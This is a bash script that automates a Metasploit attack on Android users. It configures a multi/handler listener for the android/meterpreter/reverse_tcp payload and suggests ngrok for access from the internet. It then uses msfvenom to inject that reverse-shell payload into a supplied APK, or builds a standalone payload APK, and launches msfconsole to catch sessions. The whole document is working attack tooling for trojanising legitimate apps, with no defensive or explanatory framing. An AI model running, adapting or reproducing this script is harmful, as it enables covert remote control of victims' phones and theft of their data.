#!/bin/bash
set_date=$(date)
set_date2=${set_date//' '/''}
set_date2=${set_date2//':'/''}
#payload
payload='android/meterpreter/reverse_tcp'
if [[ $1 == '--help' || $1 == '-h' ]]; then
echo "Usage: $0 'LPORT={PORT / Forwarded PORT}' 'LHOST={DNS / IP / VPS IP}' 'APK NAME={DEFAULT / null-$set_date2}'"
else
	clear
	echo '----------------------------------------------------------------------------------------------------'
	echo "Verifing dependences!"
	if [[ $(which apktool) == '' ]]; then
		echo '[-] apktool not found! Installing...'
		apt-get install apktool
	else
		echo '[+] apktool is installed!'
	fi
	sleep 3
	clear
	echo '----------------------------------------------------------------------------------------------------'
	echo "Please select the interface... (If using the 'lo' interface the attack is in no local network)"
	echo '----------------------------------------------------------------------------------------------------'
	echo 'Interface list:'
	echo '----------------------------------------------------------------------------------------------------'
	ip -o -4 addr list |awk '{print $2}' |cut -d / -f1
	echo '----------------------------------------------------------------------------------------------------'
	read -p '-> ' interface
	#lo interface
	if [[ $interface == 'lo' ]]; then
		localip=$(ip -o -4 addr list $interface |awk '{print $4}' |cut -d / -f1)
		localmac=$(ip link show $interface |awk '/loopback/ {print $2}')
		if [[ $2 == '' || $2 == 'null' ]]; then
			echo 'No DNS usage!'
			exit
		fi
	#eth interface
	elif [[ $interface == eth* ]]; then
		localip=$(ip -o -4 addr list $interface |awk '{print $4}' |cut -d / -f1)
		localmac=$(ip link show $interface |awk '/ether/ {print $2}')
	#wlan interface
	elif [[ $interface == wlan* ]]; then
		localip=$(ip -o -4 addr list $interface |awk '{print $4}' |cut -d / -f1)
		localmac=$(ip link show $interface |awk '/ether/ {print $2}')

	else
		echo "The interface '$interface' is not supported, sorry!"
		exit
	fi
	if [[ $1 == '' || $1 == 'null' ]]; then
		localport=4444
	else
		localport=$1
	fi
	if [[ $2 == '' || $2 == 'null' ]]; then
		internet_host=$localip
	else
		internet_host=$2
	fi
	#intertet services
	service apache2 restart
	service postgresql restart
	clear
	if [[ $interface == 'lo' ]]; then
		echo '----------------------------------------------------------------------------------------------------'
		echo 'Current interface can use on internet explotation, u should configure ngrok or similar...'
		localport=443
		echo "Use port $localport to connect from internet './ngrok tcp $localport'"
		echo '----------------------------------------------------------------------------------------------------'
	fi
	#configure rc file
	if [[ -f msf_conf_pc.rc ]]; then
		rm msf_conf_pc.rc
		sleep 2
		echo "use exploit/multi/handler">>msf_conf_pc.rc
		echo "set payload $payload">>msf_conf_pc.rc
		echo "set lhost $localip">>msf_conf_pc.rc
		echo "set lport $localport">>msf_conf_pc.rc
		echo "set ExitOnSession false">>msf_conf_pc.rc
		echo "exploit -j -z">>msf_conf_pc.rc
	else
		echo "use exploit/multi/handler">>msf_conf_pc.rc
		echo "set payload $payload">>msf_conf_pc.rc
		echo "set lhost $localip">>msf_conf_pc.rc
		echo "set lport $localport">>msf_conf_pc.rc
		echo "set ExitOnSession false">>msf_conf_pc.rc
		echo "exploit -j -z">>msf_conf_pc.rc
	fi
	echo '----------------------------------------------------------------------------------------------------'
	echo "Current IP: $localip"
	echo "Current MAC Address: $localmac"
	echo "Current Port: $localport"
	echo "Started at $set_date"
	echo '----------------------------------------------------------------------------------------------------'
	set_date=${set_date//' '/''}
	set_date=${set_date//':'/''}
	name_payload="reverse-$set_date"
	if [[ $1 == '' || $1 == 'null' ]]; then
		localport=4444
	else
		localport=$1
	fi
	echo 'Do u need generate payloads with this configuration? (lower case)'
	read -p '->> (yes or not) ' payloads_gen
	echo $payloads_gen
	while [[ $payloads_gen != 'yes' && $payloads_gen != 'not' ]]
	do
		read -p '->> (yes or not) ' payloads_gen
		echo $payloads_gen
	done
	if [[ $payloads_gen == 'yes' ]]; then
		#generate payloads
		echo '----------------------------------------------------------------------------------------------------'
		echo 'Writing the payloads to use...'
		if [[ -f $3 ]]; then
			application_name=$3
			echo "Set Values --> [host=$internet_host port=$localport payload=$payload type=apk]"
			msfvenom -a dalvik -p $payload LHOST=$internet_host LPORT=$localport -k -i 50 -x $application_name -o Mod_$application_name
			#msfvenom -a dalvik --platform android -p $payload LHOST=$internet_host LPORT=$localport -x $application_name -o Mod_$application_name
			if [[ -f Mod_$application_name ]]; then
				echo "The application Mod_$application_name was inyected! Check $set_date/Mod_$application_name"
				mkdir "$set_date"
				mv "Mod_$application_name" "$set_date/Mod_$application_name"
			else
				echo 'Retry!'
				msfvenom -a java -p $payload LHOST=$internet_host LPORT=$localport -k -i 50 -x $application_name -o Mod_$application_name
				#msfvenom -a java --platform android -p $payload LHOST=$internet_host LPORT=$localport -x $application_name -o Mod_$application_name
				if [[ -f Mod_$application_name ]]; then
					echo "The application Mod_$application_name was inyected! Check $set_date/Mod_$application_name"
					mkdir "$set_date"
					mv "Mod_$application_name" "$set_date/Mod_$application_name"
				else
					echo "The application Mod_$application_name wasn't inyected!"
				fi
			fi
		else
			echo "Set Values --> [host=$internet_host port=$localport payload=$payload type=apk]"
			msfvenom -p $payload LHOST=$internet_host LPORT=$localport -o $name_payload.apk
			echo "The application $name_payload.apk was created! Check $set_date/$name_payload.apk"
			mkdir "$set_date"
			mv "$name_payload.apk" "$set_date/$name_payload.apk"
		fi
	fi
	#start metasploit
	msfconsole -q -r msf_conf_pc.rc
	if [[ -f msf_conf_pc.rc ]]; then
		rm msf_conf_pc.rc
		rm sample.war
	fi
	clear
fi
